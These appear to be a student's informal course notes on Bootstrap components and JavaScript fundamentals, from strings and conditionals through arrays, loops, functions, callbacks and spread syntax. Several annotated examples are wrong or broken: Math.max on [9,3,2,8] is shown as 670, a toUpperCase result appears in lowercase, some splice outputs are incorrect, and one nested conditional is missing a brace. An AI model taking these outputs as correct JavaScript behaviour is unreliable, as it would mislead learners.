: "text-primary" ~> primary color
: "bg-info" ~> background color

<br>

#### 125. Badges, Alerts, & Button Groups
- More components!
- Badges: typically used for counts, labels, etc.
~> span class = "badge bg-colorname"

- Button Groups
~> group multiple buttons together into a group!
~> .btn-group

- Alert
~> div class = "alert alert-colorname"

~> to have the close button,
ex. <button aria-label="Close" class="btn-close" data-bs-dismiss="alert">
        <span aria-hidden="true">&times;</span>
    </button>

~> the span doesn't need to be there actually with Bootstrap v5.0 now
~> aria-label is what the screen-reader will read
~> class of btn-close to make it pretttier
~> data-bs-dismissible = "alert" to make it work

~> role = "alert" is crucial for screenreaders
: makes sure that the alert message is not ignored

- note. aria-hidden = "True": the screen-reader doesn't have to see this

- if you add "alert-dismissible fade show" class to the div, it fades out and the x goes to top right.

<br>

#### 126. Intro to BS Grid
- NOTE ~> works ONLY in a container!
- you have to create a row, using the class of row ~> typically div, but could be section or something else

- assuming 12 units wide
- if wanting equal widths, you can just assign class="col", instead of specifying the no.
~> <div class="row">

- every row in BS has 12 units in space

<br>

#### 127. Responsive Bootstrap Grids
- ex. col-md-6: after md breakpoint and up, the column should take 6 units. Everything below, the column takes 12 units

- new class for **responsive images** ~> "img-fluid"

- class="g-0" will eliminate the spacing

<br>

#### 128. Useful Grid Utilities
- Bootstrap uses Flexbox
~> can check by inspecting, and see that the class="row" already has a setting of display:flex

- .align-itmes-start/center/end
- .align-self-start/center/end
   ~> vertical alignment

- .justify-content-start/center/end/between/around
- .justify-content-sm-center
   ~> horizontal alignment

<br>

#### 129. Bootstrap &  Forms
- Several Components!
1. Form Controls
: this class is on the input itself

: .form-group ~>useful
: .form-control ~> Bootstrap class for formatting

- changing radio buttons and checkboxes is harder
~> you can use .form-check
~> or .custom-control .custom-checkbox for diff. effects

- radio buttons, switches, etc.

- form layout: can edit by using columns and rows

- .form-row : very similar to .row, and it just has a different gutter size so that the forms look more compact
~> not in the v5

<br>

#### 130. Bootstrap Navbars
- don't feel pressured to remember the navbar syntax!
- wrap things with .navbar-collapse for collapsable navbar, and expand with .navbar-expand-size
- and .navbar-toggler to show the hamburger icon
- connect that icon with the data, by data-bs-toggle="collapse" and data-bs-target="#id_name"

- cf. ml-auto: margin left is 

- placemnet ~> .fixed-top / .sticky-top / others

<br>

#### 131. Bootstrap Icons!
- new feature!
- svg
: Scalable Vector Graphics

- .input-group

- there are other icon websites!
~> most popular - fontawesome.com/start

<br>

#### 132. Other Bootstrap Utilities
- quick way to apply css properties
- many

- Border
: note. cannot change the width

- Spacing
: Margin (m) and Padding (p)
: sides - t, b, l, r, x, y, blank
: size - 0, 1, 2, 3, 4, 5, auto

: {property}{sides} - {breakpoint} - {size}

- display: inline, block, flex, none, etc.
~> d-none can hide something
~> supports responsivity

<br>

#### 133. A Mixed Bag of Other Bootstrap Stuff
- Cards: pretty commonly used
: can mix-and-match

: a container with some special features

- Carousel
: slider

- Dropdowns

- Spinner

- Progress

- Modal
: popup

<br>

## 13. OPTIONAL Museum of Candy Project
- finished code available

- order-{number}

<br>

## 14. JavaScript BASICS!
~> a week of full-time content!

<br>

#### 141. What Matters In This Section
- Crucial
: Understanding the role of JavaScript
: JavaScript Numbers
: Variables & Let
: Const
: Booleans
: Variable Naming

<br>

#### 142. Why JavaScript is Awesome
- reference - https://codepen.io/ste-vg/details/GRooLza

<br>

#### 143. Primitives & The Console
- Steps
: Step 1 - Learn JS on its own. No HTML / CSS.
: Step 2 - Use JS to manipulate HTML / CSS.

- Primitive Types (any language has primitive types)
: The Basic Building Blocks
1. Number
2. String
3. Boolean
4. Null
5. Undefined
6. xTechnically there are two others ~> Symbol and BigInt

- Running Code in The Console
: The easiest place to start
1. Early on, we will run our code using the Chrome developer tools console
~> definitely not the professional choice
2. Then we will learn how to write external scripts

- In Chrome, Inspect -> Console
: JavaScript
: or ctrl + shift + J
: you can 'undock' it as we are using it to learn only

- Some keywords
: clear() to clear the console

- "REPL"
: Read, Evaluate, Print, and Loop
: Loop means that the console does not stop and rather loops
: REPL(read-eval-print loop) 또는 인터랙티브 톱레벨(interactive toplevel), 랭기지 셸(language shell)은 단일 사용자의 입력(예: 단일 식)을 취하고 이를 평가(실행)하고 결과를 사용자에게 반환시키는 단순한 상호작용 컴퓨터 프로그래밍 환경이다. REPL 환경으로 작성된 프로그램은 구간마다 실행된다

<br>

#### 144. JavaScript Numbers
- JS has one number type
- Positive numbers
- Negative numbers

- Whole numbers (integers)
- Decimal numbers

- Math Operations
: addition, subtraction, multiplication, division, modulo, exponents, etc

- // creates a comment

- order of operation
: PEMDAS (Parentheses, Exponents, Multiplication, Division, Addition, and Subtraction)

<br>

#### 145. WTF is NaN
- Nan: Not A Number, and is a numeric value that represents something that is... not a number

- ex. 0/0 //NaN
- ex. 1 + NaN //NaN

- typeof NaN ~>  "number"

<br>

#### 147. Variables & Let
- Variables: are like labels for values
: We can store a value and give it a name so that we can
~> Refer back to it later
~> Use that value to do... stuff

- Basic Syntax
: let someName = value;

- ex. let year = 1652;

- ex. let numHens = 5;
  ex. let numRoosters = 1;
  ex. let totalChickens = numHens + numRoosters ~> 6

~> however, totalChickens does not change with the change in numHens or numRoosters
~> it is just a snapshot in time

<br>

#### 148. Updating Numbers
- ex. let score = 0;
  ex. score += 5; ~> score == 5
  ex. score++; ~> score == 6

<br>

#### 149. Const & Var
- there are two other ways to assign variables
1. const
~> const works just like let, except you CAN'T change the value
ex. const hens = 4;
ex. hens = 20; ~> ERROR!

ex. const pi = 3.14159;
ex. const daysInWeek = 7;
ex. const minHeightForRide = 60;
~> Once we cover Arrays & Objects, we will see other situations where const makes sense over let

2. var
: the old variable keyword
: before let & const, var was the only way of declaring variables
: these days there is not a reason to use it really

<br>

#### 150. Booleans
- true or false
ex. let isLoggedIn = true;
ex. let gameOver = false;

- Variables can change types!!

ex. let numPuppies = 23; // Number
ex. numPuppies = false; // Now a Boolean
ex. numPuppies = 100; // Back to Number

<br>

#### 151. Variable Naming and Conventions
- Hard Rules
: no space
: no start with number
: case-sensitive
: $, _, digits are possible
: Reference ~> MDN, identifier
~> An identifier is a sequence of characters in the code that identifies a variable, function, or property
~> In JavaScript, identifiers are case-sensitive and can contain Unicode letters, $, _, and digits (0-9), but may not start with a digit

- Conventions
: Camel-case
ex. current_date ~> snake-case
ex. currentDate ~> camel-case
~> starts with lowercase

: be clear with the variable name
ex. isLoggedIn is better than
ex. userLogIn
ex. isGameOver is better than
ex. Game

<br>

## 15. JavaScript Strings and More
#### 152. What Matters in This Section
- Crucial
: String Basics
: Indices and Length
: Undefined & Null
: String Methods
: String Template Literals

- Important
: Random Numbers & the Math Object

<br>

#### 153. Introduction to Strings
- Strings: 'strings' of characters
: Strings are another primitive type in JavaScript. They represent text, and must be wrapped in quotes

ex. let firstName = "Ziggy"; //Double quotes work
ex. let msg = "Please do not feed the chimps!";
ex. let animal = 'Dumbo Octopus'; //Single quotes too

: fine to use either single or double quotes, but be consistent

: mix them only when a string need to wrap another

<br>

#### 154. Indices & Length
- ex. let animal = "Dumbo Octopus"
  ex. animal[0] ~> "D"

- ex. animal.length  ~>  13
  ex. "lol".length ~> 3
  ex. 'abcd' + 'efg' ~> 'abcdefg'
  ex. 'abc'[0] ~> 'a'

<br>

#### 155. String Methods
- Methods are built-in actions we can perform with individual strings
- they help us do things like:
~> searching within a string
~> replacing part of a string
~> changing the casing of a string

- Reference -  developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/

- Syntax
: thing.method()

cf. "asdf".length
~> no parentheses => accessing property, not 'executing' something

- ex. let msg = "meoww";
  ex. msg.toUpperCase();
      ~> "MEOWW"
      ~> does not change the original variable

- ex. '     he    '.trim() ~> 'he'

- you can also chain methods!

ex. '     hello again!!!!!     '.trim().toUpperCase() ~>'hello again!!!!!!'
: the order does not matter

<br>

#### 156. String Methods w/Arguments
- Syntax
: thing.method(arg)

~> some methods accept **arguments** that modify their behavior. Think of them as inputs that we can pass in, we pass these args inside of the parentheses

- ex. indexOf
  ex. let tvShow = 'catdog';
  ex. tvShow.indexOf('cat'); // 0
  ex. tvShow.indexOf('dog'); // 3
  ex. tvShow.indexOf('bird'); // -1
  ~> gives the first index of the arg

- ex. slice
  ~> accepts 1+ args

  ex. let str = 'abcdefg';
  ex. str.slice(0,5); // 'abcde'
  ex. str.slice(5); // 'fg'
  ex. str.slice(-1); // 'g'
  ex. str.slice(-5); // 'cdefg'

- ex. replace
  ~> replaces only the first matching instance
  ex. let greetings = 'hello world!';
  ex. greetings.replace('hello','hiiii');
  ex. greetings.replaceAll('hello','hiiii')
  ~> **NOTE:** replaceAll() is not compatible with all the browser, check the Browser compatibility section of the MDN guide

- ex. repeat
  ex. 'lol'.repeat(3) // 'lollollol'
  ex. 'lol'.repeat(0) // empty string

<br>

#### 157. String Template Liters - SUPER USEFUL
- Template Literal
: Template Literal is strings that allow embedded expressions, which will be evaluated and then turned into a resulting string!

ex. `I counted ${3+4} sheep`; //  "I counted 7 sheeps"  

: we use back-ticks (usually above tab), NOT single quotes!

<br>

#### 158. Undefined & Null
- Null
: "Intentional absence of any value"
: Must be assigned

ex. //No one is logged in yet
ex. let loggedInUser = null; //value is explicitly yet nothing
ex. //A user logs in...
ex. loggedInUser = 'Christopher Hemsworth';  //LoggedIn

- Undefined
: Variables that do not have an assigned value are undefined

- note. typeof null ~> "objet"
  note. typeof undefined ~> "undefined"

<br>

#### 159. Random Numbers & The Math Object
- Math Object: collections of properties and methods related to mathematical constants&functions

ex. Math.PI //3.141592653589793...

ex. Math.round(4.9) //5

ex. Math.abs(-456) //456

ex. Math.pow(2,5) //32

ex. Math.floor(3.999)//3

ex. Math.ceil(3.99)//4

- in Console, you can type Math and can see properties and methods contained in that

- Random Numbers: Math.random() gives a random decimal b/w 0 and 1 (non-inclusive:  not including 1)

- Random Integers
: let's generate random numbers b/w 1 and 10
ex. const step1 = Math.random();
// 0.5961104892810127
ex. const step2 = step1 * 10;
// 5.9611...
ex. const step3 = Math.floor(step2)+ 1;
// 6

~> Math.floor(Math.random() *10) + 1;

~> can manipulate numbers to get ranges needed

<br>

## 16. JavaScript Decision Making
#### 160. What Matters In This Section
- Crucial
: Comparison Operators
: Running JavaScript From a File
: Conditionals: If, Else-If, and Else
: Truth-y and False-y Values
: Logical AND
: Logical OR
: Logical NOT

<br>

#### 161. Decision Making With Code??
- Boolean Logic: making decision w/code

<br>

#### 162. Comparison Operators
: > //greater than
: < // less than
: >= // greater than or equal to
: <= // less than or equal to

: == // equality
: != // not equal

: === // strict equality
: !== // strict non-equality  

ex. 'a' < 'b'; ~>true
~> comparison based on unicode
ex. 'A' < 'b'; ~>true

<br>

#### 163. Equality: Triple vs. Double Equals
- == (double equal)
: checks for equality of values, but not equality of type
: it coerces both values to the same type and then compares them
: this can lead to some unexpected results

ex. 0 == ''; //true

ex. null == undefined; //true

ex. '1' == 1 //true

- === (triple equal)
: checks for equality of values and types

ex. 0 === ''; //false

- So try to use *triple equals* until you become a professional software engineer

<br>

#### 164. Console, Alert, & Prompt
- console.log()
: prints arguments to the console
: (we need this if we're going to start working with files!)

ex. console.log("HELLO")
~>  HELLO

: similar to print function

- ex. alert("Hi There!")
~> pop-up

- ex. prompt("please enter a number")
~> also a pop-up

- ex.parseInt('101')
~> 101 //converts string to integer

<br>

#### 165. Running JavaScript From A Script!
- you gotta connect the JS script file to the HTML file
: include your script in .html
: ex. ~
      <script src="app.js"></script>
      </body>

~> if you connect them, you can see the JS query in the Console

~> you want to place the js link at the end of body so that all the elements are loaded in first and then js can manipulate them

<br>

#### 166. If Statements
- Conditional Statements: making decisions with codes

1. If Statement
: only runs code if given condition is met

ex. let rating = 3;
ex. if (rating === 3) {
      console.log ("You are a Superstar!");
}

<br>

#### 167. Else-If
- Else-If: If not the first thing, maybe this other thing?!

ex. let rating = 2;
ex. if (rating ===3) {
      console.log("You are a Superstar!");
    }
    else if (rating ===2) {
      console.log("Meets expectations");
    }

<br>

#### 168. Else
- Else: if nothing else was true,do this...
ex. if
ex. else if
ex. else if
ex. else if
ex. else

<br>

#### 169. Nesting Conditionals
- ex. const password = prompt("please enter a new password");
  ex. if (password.length >=6) {
        if (password.indexOf(' ')===-1) {
          console.log("GOOD JOB! NO SPACE");
        }
        else {
          console.log("PASSWORD CANNOT CONTAIN SPACES");
        }
      else {
        console.log("PASSWORD TOO SHORT! MUST BE 6+ CHARACTERS!"));
      }  

<br>

#### 170. Truth-y and False-y Values
- Truthy and Falsy Values
: All JS values have an inherent truthyness or falsyness about them
: Falsey values
~> false
~> 0
~> "" (empty string)
~> null
~> undefined
~> NaN

: Everything else is truthy

<br>

#### 171. Logical AND
- Logical Operators
: combining expressions

- AND: must be true on both sides, for the entire thing to be true
ex. 1<=4 && 'a' === 'a' ~> true

<br>

#### 172. Logical OR
- OR: if one side it true the entire thing is true

<br>

#### 173. Logical NOT
- NOT: expression returns true if expression is false
ex. !('a' === 'b') ~> true

<br>

## 17. JavaScript Arrays
#### 174. What Matters In This Section
- Crucial
: Array Basics - Creating and Updating

: Push & Pop

: Shift & Unshif

- Important
: Cocat, IndexOf
: Slice & Splice

: Multi Dimensional Arrays

<br>

#### 175. JS Arrays
- Arrays: Ordered collection of values
ex. list of comments on IG post
ex. collection of levels in a game

- Creating Arrays
ex. let students = [];
ex. let colors = ['red', 'orange', 'yellow'];
ex. let combo = ['anchovies', 1];

<br>

#### 176. Array RandomAccess
- Arrays are Indexed
: each element has a corresponding index

- Modification to Arrays
: ex. let sample = [5, 2, 3, 4, 5];
  ex. sample[0] = 1;
  ex. sample ~> [1,2,3,4,5]

: vs. for strings modification to one element is not possible

<br>

#### 177. Push AND Pop
#### 178. Shift AND Unshift
- Push: add to end
- Pop: remove from end
- Shift: remove from start
- Unshift: add to start

<br>

#### 179. Concat, indexOf, includes & reverse
- More Methods
: concat - merge arrays
ex. const array1 = ['a','b','c']
ex. const array2 = ['d','e','f']
ex. const array3 = array1.concat(array2);
~> array3 => ['a','b','c','d','e','f']

: includes - look for a value
ex. array1.includes('a') ~> true

: indexOf - just like string.indexOf
ex. array1.indexOf('b') ~> 1

: join - creates a string from an array
: reverse - reverses an array
ex. array1.reverse() ~> ['c','b','a']

: slice - copies a portion on an array
ex. array1.slice() ~> ['a','b','c']
ex. array1.slice(1) ~> ['b','c']
ex. array1.slice(1,2) ~> ['b']
ex. array1.slice(-2) ~> ['b','c']

: splice - removes/replaces elements
~> changes the contents of an array by removing or replacing elements and/or adding new elements in place
ex. array1.splice(1,0,'sss'); ~> ['a','sss','b','c']
ex. array1.splice(1,1) ~> ['a','b','c']
ex. array1.splice(1,2,'eee','www') ~> ['a','b','eee','www']

~> not recommended to use to insert elements at the middle of the array though
: sort - sorts an array

<br>

#### 181. Reference Types & Equality Testing
- ex. [1] === [1] ~> false
  ex. [1] == [1] ~> false
  ex. [] == [] ~> false

  ~> in JS, array comparison considers the reference in the memory

  ex. let nums = [1,2]
  ex. let numsCopy = nums;
  ex. nums.push(4)
  ex. nums ~> [1,2, 4]
  ex. numsCopy ~> [1,2, 4]
  
  ~> because both are referring to the same thing in the memory
  ~> same in Python

  ~> thus comparing the elements in the arrays take more work

- cf. [1] == [1] ~> True in Python

<br>

#### 182. Arrays + Const

- defining arrays with const is pretty common
~> cuz we can still change the contents, as long as "the reference" remains the same

ex. const myEggs = ['brown', 'brown'];
ex. myEggs.push('purple']);

ex. myEggs = ['blue','pink'] // NO! as the reference is being forced to be changed

<br>

#### 183. Multi-Dimensional Arrays
- Nested Arrays
: we can store arrays inside other arrays!
ex. const boar = [
      ['O',null,'X'],
      [null,'X','O'],
      ['X','O',null]
    ]

<br>

## 18. JS Object Literals
#### 184. What Matters In This Section
- Crucial
: Creating and Working with Object Literals
: Nesting Arrays and Objects

<br>

#### 185. Introducing Object Literals
- JS Objects: our second data structure

- Objects: are collections of **properties**
: properties are a **key-value pair**
: rather than accessing data using an index, we use custom keys

ex. const fitbitData = {
        totalSteps: 308727,
        totalMiles: 211.7,
        avgCalorieBurn: 5755,
        workoutsThisWeek: '5 of 7 dys',
        avgGoodSleep: '2h 13m'}
: no order!

<br>

#### 186. Creating Object Literals
- ex. const chicken = {species: 'Silkie', name:'Albert'}

- also points at the memory like arrays

<br>

#### 187. Accessing Data Out of Objects
- ex. chicken['species'] ~> 'Silkie'
  ex. chicken.species ~>  'Silkie'

- NOTE: *VALID KEYS*~> All keys are converted to strings, except for symbols which we haven't covered yet
~> cf. you had to explicity say {'a':1} for dictionaries in Python

- perks of using the square bracket notation...
~> ex. let curious = 'species'
   ex. chicken[curious] ~> 'Silkie'

<br>

#### 188. Modifying Objects
- ex. chicken.lastName = 'Hemsworth';

<br>

#### 189. Nesting Arrays & Objects 
- Arrays + Objects : Combination is Powerful!
- ex. const shoppingCartStatus = [
        {
            product: 'Jenga Classic',
            price: 6.88,
            quantity: 1
        },

        {
            proudct: 'Eggs',
            price: 3.99,
            quantity: 1
        },

        {
            product: 'Egg Basket',
            price: 10.12,
            quantity: 1
        }
    ]

- ex. const student = {
          firstName: 'David',
          lastName: 'Jones',
          strengths: ['Music','Art'],
          exams: {
              midterm: 92,
              final: 88
          }
      }

<br>

## 19. Repeating Stuff With Loops
#### 190. What Matters In This Section
- Crucial
: For Loops
: While Loops
: The Break Keyword
: For...Of Loop

: Iterating Arrays

- Important
: Nested Loops

- Nice To Have
: Iterating Objects

<br>

#### 191. Intro to For Loops
- Loops: loops allow us to repeat code
~> for loop
~> while loop
~> for ... of loop
~> for ... in loop

- Syntax
~> for (
      [initialExpression];
      [condition];
      [incrementExpression]
    )
ex. for (let i=1; i<=10; i++) {
      console.log(i);
    }

<br>

#### 193. The Perils Of Infinite Loops :(
- Avoid Infinite Loops

<br>

#### 194. Looping Over Arrays 
- ex. const animals = ['lions','tigers','chimpanzees'];
  ex. for (let i=0; i<animals.length; i++) {
          console.log(i, animals[i]);
      }

<br>

#### 196. Another Loop: The While Loop
- ex. let num = 0;
  ex. while (num <10) {
          console.log(num);
          num++ }

- ex. const SECRET = "BabyHippo";
  ex. let guess = prompt("enter the secret code...");
  ex. while (guess !== SECRET) {
          guess = prompt("enter the secret code...");
      }
  ex. consolg.log("got it!");

<br>

#### 197. The Break Keyword
- ex. let inpu = prompt("Hey, say something!")
  ex. while (true) {
        input = prompt(input);

        if (input === "stop copying me") break;
      }
      console.log("yeah you win");

<br>

#### 199. The Lovely For ... Of Loop
- For ... Of
: a nice and easy way of iterating over arrays (or other iterable objets)
: newer
: not available in Explorer

- Syntax
~> for (variable of iterables) {
      statement
    }

- ex. const chicken = ['Silkie', 'Brown', 'White']
  ex. for (let item of chicken) {
          console.log(item);
      }
  ex. for (let char of "hello") {
          console.log(char);
      }

<br>

#### 200. Iterating Over Objects
- the object with key value pairs is NOT Iterable!

- FOR ... IN Loop
~> For ... in is pretty UNCOMMON these days
~> but it enables iterating *over* objects
~> gives back the key in the object

- Another option...
~> Use a special method
~> **Object.keys(object_name);**
   => gives you an array made up of keys
   **Object.values(object_name);**
   => gives you an array made up of values
   **Object.entries(object_name);**
   => Nested arrays of key value pairs

~> cf. for ... in for iterable arrays gives you back only the indices

<br>

## 20. NEW: Introducing Functions
#### 203. What Matters in This Section
- Crucial
: Defining Functions
: Working with Arguments
: Function Return Values
: Function Exercises

<br>

#### 204. Intro to Functions
- Functions: reusable procedures
: Functions allow us to write reusable, modular code
: we define a "chunk" of code that we can then execute at a later point
: we use them ALL THE TIME

<br>

#### 205. Our Very First Function
- 2 Step Process: (1) Define, (2)Run

1. Define
ex. function funcName() {
      //do something
    }

2. Run
ex. funcName(); //run once

ex. funcName(); //run again

<br>

#### 206. Argument Intro
- ex. function greet(firstName){
          console.log(`Hello ${person}`);
      }

- note: argument is what's passed into (ex. 'Elvis')

  : parameter is the placeholder (ex. firstName)

<br>

#### 207. FUnctions with Multiple Arguments
- ex. function repeat(message, number){
        let result = '';
        for (let i=0; i<number; i++) {

            result += message
        }
        console.log(result);
  }

<br>

#### 208. The Return Keyword
- Return: Built-in Methods **return** values when we call them and we can store those values somewhere

: return actually stops the execution of function!

: returns a single value only

<br>

## 21. Levelling Up Our Functions
#### 209. What Matters In This Section
- Crucial
: Function Scope
: Block Scope
: Lexical Scope
: Function Expressions
: Higher-Order Functions
: The Keyword "this"

- Important
: Returning Functions
: Adding Methods To Objects

<br>

#### 210. Function Scope
- Scope
: variable "visibility"
: the location where a variable is defined dictates where we have access to that variable

- a variable defined in the function is only accessible within that specific function

- refer to the scope diagram

<br>

#### 211. Block Scope
- Block: a chunk of codes incased in the curley braces ~> conditionals and loops

~> block scope is the same as the function scope logic-wise

- cf. python does not support creating block scope
  : https://stackoverflow.com/questions/6167923/block-scope-in-python
  : while the following construcs create scope
  ~> module
  ~> class
  ~> function incl. lambda
  ~> general expression
  ~> comprehensions - dict, set, list in Python3.x
- NOTE: if you define a variable using **var** the variable becomes global
~> so avoid it

<br>

#### 212. Lexical Scope
- nested function has access to variables defined in the parental functions

<br>

#### 213. Function Expressions
- Ways of defining functions...
1. Function Statement
ex. function sumNumbers(a,b) {
        return a+b;
    }
~> making a function with the name

2. Function Expressions
: storing a function in a variable
ex. const sumUp = function (a,b) {
        return a+b;
    }

ex. sumUp(a,b);

~> making a function without a name, storing it in a variable, and letting the function to run behind the scene

<br>

#### 214. Higher-Order Functions
- Higher-order functions: functions that operate on or with other functions
: they can accept other functions as arguments, and return a function

- ex. function callTwice(func){
        func();
        func();
    }

      function rollDice(){
        const roll = Math.floor(Math.random()*6)+1;
        console.log(roll);
      }

      callTwice(rollDice)

<br>

#### 215. Returning Functions
- returning a function inside a function

- ex. function makeBetween(min,max){
          return function(num){
              return num>=min && num<=max;
          }
    }
      const isBetween = makeBetween(1,5);
      isBetween(3);

<br>

#### 216. Defining Methods
- Methods: we can add functions like properties on objects
  : we can tell them **methods**!

- ex. const calc = {
        add: function(x,y) {
            return a+b;
        }
        round: function(x) {
            return Math.round(x);
        }
      }

- shorthand - more popular!
  ex. const calc = {
        blah: 'Hi!',
        add(x,y) {
            return x+y;
        },
        round(x){
            return Math.round(x);
        }
      }

- cf. in Python,
  ex. class Product:
          def __init__(self, name, price):
              self.name = name
              self.price = price
          def myfunc(self):
              print("Hi this is "+ self.name +"which costs $ "+ self.price)
      soup = Product("soup",3.99)
      soup.myfunc()

<br>

#### 217. The Mysterious Keyword: "This"
- 'This' in methods: use the keyword 'this' to access other properties in the same **OBJECT**
  ex. const product = {
        name: "soup"
        price: 3.99
        fullInfo() {
            return `To buy ${this.name} you need $${this.price} `
        }
  }

- ATTENTION! the value of **this** depends on the invocation context of the function it's used 
  ex. product.fullInfo()
  ~> returns the expected
  ex. const soup = product.fullInfo
      soup()
      ~> does NOT return the expected!
      ~> cuz this is referring to **window** object, which is the top-level obj. for all
      ex. prompt() == window.prompt ()
      ~> so soup() == window.soup() and cuz window object does not have 'name' and 'product' info, it will not return the same

<br>

#### 218. Using Try / Catch
- ex. try {
        //if the following could result in any error
        hello.toUpperCase();
      }catch (e){
        //if 'try' resulted in any error, and e is the error that is caught! 
        console.log("error");
      }

- can handle errors
- can make sure that the code keeps running even after an error occured 

<br>

## 22. Callbacks & Array  Methods
#### 219. What Matters in This Section
- Crucial
: ForEach
: Map
: Arrow Functions
: Filter

- Nice To Have
: Some & Every
: Reduce

<br>

#### 220. What Is This Section Even About?
- Goals
: use the new arrow function syntax
: understand and use these methods
~> forEach
~> map
~> filter
~> reduce
~> find
~> some
~> every

<br>

#### 221. The forEach Method
- ForEach: accepts a callback function
: calls the function once per element in array

- ex. const nums = [1, 2, 3];
  ex. nums.forEach(function (n) {
          console.log(n*n);
      });
      //prints: 1, 4,9
      nums.forEach(function (el) {
            if(el%2 === 0){
                  console.log(el);
            }
      }) ;
      //prints: 2
  
~> with the advent of for ... of => for (let el of iterables) {} (newer syntax) forEach is being less popular
~> anonymous function used only for that specific use, once!

- array callback methods ~> the methods which expect functions

<br>

#### 222. The Map Method
- MAP: Creates a new array with the results of calling a callback on every element in the array

~> a way to "map" one state to another state

- ex. const texts =['a','b','c'];
  ex. const caps = texts.map(function(text){
        return text.toUpperCase();
      })

<br>

#### 223. Introduction to Arrow Functions
- Arrow Func's : Syntatically compact alternative to a regular function expression
- ex. const square = (x) => {
          return x*x;
      }
  ex. const sum = (x,y) => {
          return x+y;
      }

~> very useful when a function is a one-time thing

- ex. const randNum = () => {
          return Math.floor(Math.random)
}

<br>

#### 224. Arrow Function Implicit Returns
- Implicit Returns: can only do with arrow functions
  ex. //Regular function expression
  ex. const isEven = function (num){
          return num %2 == 0;
      }
  ex. //arrow function with parens around param
  ex. const isEven = (num) => {
          return num %2 ===0;
      }
  ex. //no parans around param
  ex. const isEven = num => {
          return num %2 ===0; // only works with one param
      }
  ex. //implicit return
  ex. const isEven = num => (
          num %2 ===0
      )
  ex. const isEven = num => num%2 ===0; //one-liner

  ~> good for simple functions

<br>

#### 225. Arrow Functions WrapUp
- ex. const titles=movies.map(function(el) {
          return el.title;
      })
  ex. const titles =movies.map(el)=> el.title;

~> arrow functions pop up a lot when you need to pass in another

<br>

#### 226. setTimeOut and setInterval
- both expect you to pass the callback functions in, but they are not array methods

- setTimeOut & setInterval: relevant to *scheduling*

- cf.other languages: use 'waiting' functions like sleep()or pause()

- in JavaScript, use
1. setTimeout (handler: TimerHandler [function], timeout?: number ... arguments: any[]): number
~> after the desginated time, the function will run

ex. setTimeout(() => {
        console.log("HELLO!")
    }, 3000)
    ~> two arguments: (1) a function and (2) ms

ex. console.log(~~~) - 1
    setTimeout()~~~ - 2 
    console.log(~~~) - 3
    ~> 1 and 3 run immediately, and 2 runs after the designated timeframe

2. setInterval()
~> the function runs every n seconds

ex. setInterval(() => {
        console.log("HELLO!!")
    },3000)

3. to stop the interval...
: clearInterval(id)
~> assign id to the interval and stop
~> ex. const id = setInterval() ...

<br>

#### 227. The Filter Method
- Filter: creates a new array with all elements that **pass** the test implemented by the provided function

ex. const nums = [9,8,7,6,5,4,3,2,1];
ex. const odds = nums.filter(n => {
      return n % 2 === 1; //our callback returns true or false
      //if it returns true, n is added to the filtered array
    })
    // [9,7,5,3,1]

ex. const smallNums = nums.filter(n => n <5);

ex. let movies = [
      {
        title: 'Alien',
        score: 90,
        year: 1979
      }
      ...
    ]
ex. const goodMovies = movies.filter (m => m.score>=90)
~> often we combine map and filter

ex. const goodMoviesList = goodMovies.map(m => m.title)

ex. const goodMoviesList = movies.filter(m => m.score >= 90).map(m => m.title)

~> if the code becomes too long, you can indent lines too
ex. const goodMoviesList = movies
        .filter(m => m.score >=90)
        .map(m => m.title);

<br>

#### 228. Some & Every Methods
- Both of them return boolean!

- Every
: returns true if **all** elements in the array pass the provided function

- Some
: Similar to every, but returns true if ANY of the array elements pass the test function

ex. const words = ['dog',  'jello', 'vlog', 'cupcake', 'bag', 'wag'];

ex. //Are all words 3-letter long?
ex. words.every(word => {
      return word.length === 3;
    }) //false

ex. //Are there any words longer than 4 characters?
ex. words.some(word => {
      return word.length > 4;
    }) //true

ex. //Do any words start with 'Z'?
ex. words.some(word => word[0] === 'Z'); //false

ex. //Do any words contain 'cake'?
ex. words.some(word => word.includes('cake') ); //true

<br>

#### 229. The Notorious Reduce Method
- Reduce
: Executes a reducer function on each element of the array, **resulting in a single value** !!!!!
~> two parameters!

ex. //Summing An Array
ex. [3,5,7].reduce((accumulator, currentValue) => {
        return accumulator + currentValue;
    }
ex. ~> callback   | accumulator | curentValue | return
       first call | 3           | 5           | 8
       second call| 8           | 7           | 15

~> can use it for calculations and comparisons and so on

- the second argument to the reduce function will be the **starting point** for the first parameter!

<br>

#### 230. Arrow Functions & "this"
- the keyword 'this' behaves differently inside an arrow function and other functions!

- ex. const marketItem = {
        productName: 'soup',
        price: 3.99
        fullInfo: function() {
            return `You need ${this.price} to purchase ${this.productName}!`
        }
      }
      ~> works!
  ex. however, with arrow function like
        ...
        fullInfo: () => `${this.price) +${this.productName}`
      
      ~> it does not work, because with the arrow function, *this* refers to the scope that it's created in! (i.e. window)

- vs. when we use 'this' in a non-arrow func.,  'this'has nothing to do with the scope! It is related to how the function is executed, rather.

- so carefully decide if you wanna use a regular function or an arrow function when defining an object method!

<br>

## 23. Newer JavaScript Features
#### 231. What Matters In This Section
- Crucial
: Spread with Arrays
: Spread with Objects

: Destructuring

- Important
: Default Params
: Spread in Function Calls

: Rest Params

<br>

#### 232. Default Params
- Default Params: The Old Way
ex. function multiply(a,b) {
      b = typeof b !== 'undefined' ? b : 1;
      return a*b;
    }

- Default Params: The New Way
ex. function multiply(a,b=2) {
      return a*b;
  } 

~> note: the param with the default should come after the one without the default

<br>

#### 233. Spread in Function Calls
- Spread
: Spread syntax allows an iterable such as an array to be **expanded** in places where zero or more arguments (for function calls) or elements (for array literals) are expected,
: or an object expression to be expanded  in places where zero or more key-value pairs (for object literals) are expected 

- Spread for Function Calls
: expands an iterable (array, string, etc.) into a list of arguments
ex. const nums = [9,3,2,8];
ex. Math.max(nums); //NaN
ex. //Use spread!
ex. Math.max(...nums); //670  
ex. //Same as calling:
    //Math.max(9,3,2,8)

<br>

#### 234. Spread with Array Literals
- Create a new array using an existing array. Spreads the elements from one array into a new array.
- ex. const nums1 = [1,2,3];
  ex. const nums2 = [4,5,6];

  ex. [...nums1, ...nums2];
  ex. // [1,2,3,4,5,6]

  ex. ['a','b',...nums2];
  ex. //['a','b',4,5,6]

  ex. [...nums1, ...nums2,7,8,9];
  ex. //[1,2,3, 4,5,6, 7,8,9]

  ex. [..."hello"];
  ex. //["h","e","l","l","o"]

<br>

#### 235. Spread with Objects
- Copies properties from one object into another object literal

ex. const feline = {legs:4, family: 'Felidae'}
ex. canine = {family: 'Caninae',furry:true}

ex. const dog = {...canine, isPet: true}
